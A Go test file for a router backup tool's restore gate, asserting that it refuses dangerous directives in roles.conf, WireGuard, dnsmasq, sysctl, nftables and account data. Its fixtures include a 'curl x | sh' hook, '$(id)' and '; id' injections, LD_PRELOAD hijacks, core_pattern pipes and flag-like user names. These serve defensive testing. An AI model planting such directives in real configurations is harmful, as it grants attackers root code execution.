package router

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/tui-tools/tui-router/internal/backup"
)

// TestCheckRestoreRefusesEachDangerousClass asserts the content gate refuses
// every class of directive that would run a command or load files from
// elsewhere as root, and that each refusal names the file the line would land
// in and the line number — the two things the preview has to show.
func TestCheckRestoreRefusesEachDangerousClass(t *testing.T) {
	cases := []struct {
		name     string
		src      backup.Sources
		wantFile string
		wantLine int
	}{
		// roles.conf: only the allowlisted keys, each value validated.
		{"roles PATH", backup.Sources{Roles: "WAN_IFS=\"eth0\"\nPATH=\"/var/tmp/x:/usr/bin\"\n"},
			RolesConfPath, 2},
		{"roles LD_PRELOAD", backup.Sources{Roles: "# c\nLAN_IFS=\"eth1\"\n\nLD_PRELOAD=/var/tmp/x.so\n"},
			RolesConfPath, 4},
		{"roles BASH_ENV", backup.Sources{Roles: "BASH_ENV=\"/var/tmp/x\"\n"}, RolesConfPath, 1},
		{"roles export", backup.Sources{Roles: "WAN_IFS=\"eth0\"\nexport LAN_IFS=eth1\n"}, RolesConfPath, 2},
		{"roles command", backup.Sources{Roles: "id\n"}, RolesConfPath, 1},
		{"roles bare blank", backup.Sources{Roles: "LAN_IFS=eth1 touch /tmp/x\n"}, RolesConfPath, 1},
		{"roles bad knob", backup.Sources{Roles: "LAN_DHCP=\"yes; id\"\n"}, RolesConfPath, 1},
		{"roles bad address", backup.Sources{Roles: "LAN_ADDRESS=\"$(id)\"\n"}, RolesConfPath, 1},

		// WireGuard hooks: wg-quick runs them as root.
		{"wg PostUp", wgSources("wg0", "[Interface]\nAddress = 10.0.0.1/24\nPostUp = curl x | sh\n"),
			"/etc/wireguard/wg0.conf", 3},
		{"wg PreUp", wgSources("wg0", "[Interface]\nPreUp = id\n"), "/etc/wireguard/wg0.conf", 2},
		{"wg PostDown", wgSources("wg0", "[Interface]\npostdown=id\n"), "/etc/wireguard/wg0.conf", 2},
		{"wg PreDown", wgSources("wg0", "[Interface]\n  PreDown = id\n"), "/etc/wireguard/wg0.conf", 2},
		{"wg key hook for another interface",
			wgSources("wg0", "[Interface]\nPostUp = wg set %i private-key /etc/wireguard/wg1.key\n"),
			"/etc/wireguard/wg0.conf", 2},
		{"wg key hook with a command appended",
			wgSources("wg0", "[Interface]\nPostUp = wg set %i private-key /etc/wireguard/wg0.key; id\n"),
			"/etc/wireguard/wg0.conf", 2},
		{"wg iptables form with the wrong verb",
			wgSources("wg0", "[Interface]\nPostDown = iptables -I FORWARD -i %i -o eth0 -j ACCEPT\n"),
			"/etc/wireguard/wg0.conf", 2},
		{"wg iptables form with a substitution",
			wgSources("wg0", "[Interface]\nPostUp = iptables -I FORWARD -i %i -o $(id) -j ACCEPT\n"),
			"/etc/wireguard/wg0.conf", 2},
		{"wg name read as a flag", wgSources("-h", "[Interface]\n"), "/etc/wireguard/-h.conf", 0},

		// dnsmasq: scripts, and files outside the managed locations.
		{"dnsmasq dhcp-script", backup.Sources{DHCPDNS: "interface=lan0\ndhcp-script=/var/tmp/x\n"},
			dnsmasqRouterConf, 2},
		{"dnsmasq dhcp-luascript", backup.Sources{DHCPDNS: "dhcp-luascript=/var/tmp/x.lua\n"},
			dnsmasqRouterConf, 1},
		{"dnsmasq conf-file", backup.Sources{DHCPDNS: "conf-file=/var/tmp/evil.conf\n"}, dnsmasqRouterConf, 1},
		{"dnsmasq conf-dir climbing out", backup.Sources{DHCPDNS: "conf-dir=/etc/dnsmasq.d/../../var/tmp\n"},
			dnsmasqRouterConf, 1},
		{"dnsmasq servers-file", backup.Sources{DHCPDNS: "servers-file=/home/u/servers\n"}, dnsmasqRouterConf, 1},
		{"dnsmasq addn-hosts", backup.Sources{DHCPDNS: "addn-hosts=/root/hosts\n"}, dnsmasqRouterConf, 1},
		{"dnsmasq dhcp-hostsfile", backup.Sources{DHCPDNS: "dhcp-hostsfile=/tmp/h\n"}, dnsmasqRouterConf, 1},
		{"dnsmasq tftp-root", backup.Sources{DHCPDNS: "enable-tftp\ntftp-root=/\n"}, dnsmasqRouterConf, 2},

		// sysctl: knobs that name a program, and anything outside net.*.
		{"sysctl core_pattern", backup.Sources{Sysctl: "net.ipv4.ip_forward=1\nkernel.core_pattern=|/var/tmp/x\n"},
			sysctlRouterConf, 2},
		{"sysctl modprobe slashes", backup.Sources{Sysctl: "kernel/modprobe = /var/tmp/x\n"}, sysctlRouterConf, 1},
		{"sysctl hotplug ignore-errors", backup.Sources{Sysctl: "-kernel.hotplug=/var/tmp/x\n"}, sysctlRouterConf, 1},
		{"sysctl poweroff_cmd", backup.Sources{Sysctl: "kernel.poweroff_cmd=/var/tmp/x\n"}, sysctlRouterConf, 1},
		{"sysctl usermodehelper", backup.Sources{Sysctl: "kernel.usermodehelper.bset=4294967295 63\n"},
			sysctlRouterConf, 1},
		{"sysctl binfmt_misc", backup.Sources{Sysctl: "fs.binfmt_misc.register=:x:E::y::/var/tmp/x:\n"},
			sysctlRouterConf, 1},
		{"sysctl outside net", backup.Sources{Sysctl: "vm.overcommit_memory=1\n"}, sysctlRouterConf, 1},

		// nftables: an include reads rules from outside the artifact.
		{"nftables include", backup.Sources{Nftables: "table inet t {}\ninclude \"/var/tmp/x.nft\"\n"},
			nftablesLabel, 2},
		{"nftables include after a command", backup.Sources{Nftables: "flush ruleset; include \"/x\"\n"},
			nftablesLabel, 1},
		{"firewall-rules include", backup.Sources{FirewallRules: "# saved\ninclude \"/var/tmp/*.nft\"\n"},
			firewallRulesPath, 2},

		// networkd: only the unit kinds an export carries.
		{"networkd service unit", backup.Sources{Networkd: map[string]string{"evil.service": "[Service]\n"}},
			"/etc/systemd/network/evil.service", 0},

		// accounts: a name reaches the useradd argv.
		{"account read as a flag", backup.Sources{Accounts: []backup.Account{{Name: "-ou0"}}}, accountsLabel, 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := CheckRestore(tc.src)
			if len(findings) != 1 {
				t.Fatalf("want exactly one finding, got %d: %v", len(findings), findings)
			}
			f := findings[0]
			if f.File != tc.wantFile || f.Line != tc.wantLine {
				t.Errorf("finding at %s:%d, want %s:%d (%s)", f.File, f.Line, tc.wantFile, tc.wantLine, f)
			}
			if f.Reason == "" {
				t.Errorf("a finding must say why: %+v", f)
			}
			if tc.wantLine > 0 && !strings.Contains(f.String(), f.Text) {
				t.Errorf("the rendered finding does not show the line: %q", f.String())
			}
		})
	}
}

// wgSources builds Sources carrying one WireGuard conf.
func wgSources(name, conf string) backup.Sources {
	return backup.Sources{Wireguard: map[string]backup.WGConf{name: {Config: conf}}}
}

// The supporting files exactly as the router profile writes them
// (omarchy-server, install/router/network-router.sh), and a WireGuard
// forwarding server exactly as tui-wireguard writes one (InterfaceConfWith,
// ForwardingRules, and the pre-shared key hook of its save). They are the
// no-false-positive fixtures: a machine set up by the family must restore.
const (
	profileRolesSeed = `# Omarchy Router: which interfaces play which role. Each role is a SET -- list
#   WAN_IFS="enp1s0"                 # one or more uplinks, by name
#   LAN_ADDRESS=10.55.0.1/24   the gateway address the LAN holds
#   LAN_DHCP=yes               run a DHCP server on the LAN (default yes)
WAN_IFS=
WAN_MACS=
LAN_IFS=
LAN_MACS=
`
	profileSysctl = `# Omarchy Router: forward packets between interfaces. The firewall
# (/etc/nftables.conf, the ` + "`inet tui`" + ` table) decides what forwarding is
# allowed. Written by install/router/network-router.sh.
net.ipv4.ip_forward=1
net.ipv6.conf.all.forwarding=1
`
	profileResolved = `# Omarchy Router: answer LAN DNS on the gateway address, forward upstream.
# Written by install/router/network-router.sh.
[Resolve]
DNSStubListenerExtra=10.55.0.1
`
	tuiWireguardServer = `[Interface]
# The private key lives in /etc/wireguard/wg1.key (root, mode 600) and is loaded
# at up time; this file deliberately contains no secret.
Address = 10.8.0.1/24
ListenPort = 51820
PostUp = wg set %i private-key /etc/wireguard/wg1.key
PostUp = wg set %i peer AbCdEf0123456789AbCdEf0123456789AbCdEf01234= preshared-key /etc/wireguard/wg1-AbCdEf01.psk
# Forwarding server: peers reach the networks behind this host through eth0.
PostUp = iptables -I FORWARD -i %i -o eth0 -d 192.0.2.0/24 -j ACCEPT
PostUp = iptables -I FORWARD -i eth0 -o %i -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
PostUp = iptables -t nat -I POSTROUTING -s 10.8.0.0/24 -o eth0 -d 192.0.2.0/24 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -o eth0 -d 192.0.2.0/24 -j ACCEPT
PostDown = iptables -D FORWARD -i eth0 -o %i -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
PostDown = iptables -t nat -D POSTROUTING -s 10.8.0.0/24 -o eth0 -d 192.0.2.0/24 -j MASQUERADE

[Peer]
PublicKey = AbCdEf0123456789AbCdEf0123456789AbCdEf01234=
AllowedIPs = 10.8.0.2/32
`
	routerDnsmasq = `interface=lan0
dhcp-range=192.0.2.100,192.0.2.200,12h
conf-dir=/etc/dnsmasq.d/,*.conf
addn-hosts=/etc/hosts
dhcp-leasefile=/var/lib/misc/dnsmasq.leases
log-facility=local0
`
)

// TestFamilyWrittenStateRoundTripsThroughTheGate is the no-false-positive
// guard: a router whose files were written by the family's own writers — the
// roles wizard's render, the profile's seed and drop-ins, tui-wireguard's
// server conf — is collected by the demo's collector (which strips keys and
// canonicalises roles.conf exactly as the real one does), assembled into an
// artifact, read back, passes the gate, and is written into a clean machine.
func TestFamilyWrittenStateRoundTripsThroughTheGate(t *testing.T) {
	ctx := context.Background()
	wizard, err := RenderRolesConf(RolesConf{
		Assignment: RoleAssignment{WANIfs: []string{"eth0"}, LANIfs: []string{"eth1", "eth2"},
			LANMacs: []string{"00:00:5e:00:53:11"}},
		Extras: []string{`LAN_ADDRESS="10.55.0.1/24"`, `LAN_DHCP="yes"`},
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, roles := range []string{wizard, profileRolesSeed, demoRolesConf} {
		src := NewFake()
		src.roles.content = roles
		src.rawWG["wg1"] = tuiWireguardServer
		src.sysctl = profileSysctl
		src.resolved = profileResolved
		src.dhcpDNS = routerDnsmasq

		collected, err := src.CollectSources(ctx)
		if err != nil {
			t.Fatal(err)
		}
		data, err := backup.Assemble(collected, backup.Meta{ToolVersion: "test", Hostname: "h", Timestamp: "t"}, nil)
		if err != nil {
			t.Fatal(err)
		}
		art, err := backup.Open(data, nil)
		if err != nil {
			t.Fatal(err)
		}
		if findings := CheckRestore(art.Sources); len(findings) > 0 {
			t.Fatalf("the gate refused state the family wrote itself:\n%v", findings)
		}

		dst := NewEmptyFake()
		for _, part := range []struct{ subsystem, name, content string }{
			{backup.SubsystemRoles, "", art.Sources.Roles},
			{backup.SubsystemSysctl, "", art.Sources.Sysctl},
			{backup.SubsystemResolved, "", art.Sources.Resolved},
			{backup.SubsystemDHCPDNS, "", art.Sources.DHCPDNS},
			{backup.SubsystemFirewallRules, "", art.Sources.FirewallRules},
			{backup.SubsystemWireguard, "wg1", art.Sources.Wireguard["wg1"].Config},
		} {
			if err := dst.WriteConfig(ctx, part.subsystem, part.name, part.content); err != nil {
				t.Fatalf("writing %s: %v", part.subsystem, err)
			}
		}
		if dst.rawWG["wg1"] != art.Sources.Wireguard["wg1"].Config {
			t.Errorf("the WireGuard conf did not land as carried")
		}
	}
}

// TestSafeRolesConfAllowlist asserts the roles.conf sanitizer is an allowlist:
// a plain uppercase assignment it does not know is refused (the old
// metacharacter denylist let PATH and LD_PRELOAD through), and the error names
// the line.
func TestSafeRolesConfAllowlist(t *testing.T) {
	for _, line := range []string{
		`PATH="/var/tmp/x:/usr/bin"`,
		`LD_PRELOAD="/var/tmp/x.so"`,
		`LD_LIBRARY_PATH="/var/tmp"`,
		`BASH_ENV="/var/tmp/x"`,
		`IFS="x"`,
		`OMARCHY_INSTALL="/var/tmp"`,
	} {
		_, err := SafeRolesConf("WAN_IFS=\"eth0\"\n" + line + "\n")
		var refused *RestoreRefusedError
		if !errors.As(err, &refused) {
			t.Errorf("SafeRolesConf accepted %s (err %v)", line, err)
			continue
		}
		if got := refused.Findings[0]; got.Line != 2 || got.Text != line {
			t.Errorf("the refusal does not name line 2 %q: %+v", line, got)
		}
	}
	// The knobs are canonicalised, whatever quoting the file used.
	out, err := SafeRolesConf("LAN_ADDRESS=10.55.0.1/24\nLAN_DHCP='no'\n")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`LAN_ADDRESS="10.55.0.1/24"`, `LAN_DHCP="no"`} {
		if !strings.Contains(out, want) {
			t.Errorf("the render lacks %s:\n%s", want, out)
		}
	}
}

// TestRealWriteConfigRefusesBeforeWriting asserts the exec-site gate: the
// real backend refuses a hostile part before it looks for a writer, so no
// command is built for it at all.
func TestRealWriteConfigRefusesBeforeWriting(t *testing.T) {
	r := &Real{}
	err := r.WriteConfig(context.Background(), backup.SubsystemSysctl, "", "kernel.core_pattern=|/var/tmp/x\n")
	var refused *RestoreRefusedError
	if !errors.As(err, &refused) {
		t.Fatalf("the real backend did not refuse a core_pattern drop-in: %v", err)
	}
	err = r.ApplyAccounts(context.Background(), []backup.Account{{Name: "--uid=0"}})
	if !errors.As(err, &refused) {
		t.Fatalf("the real backend did not refuse an account name read as a flag: %v", err)
	}
}
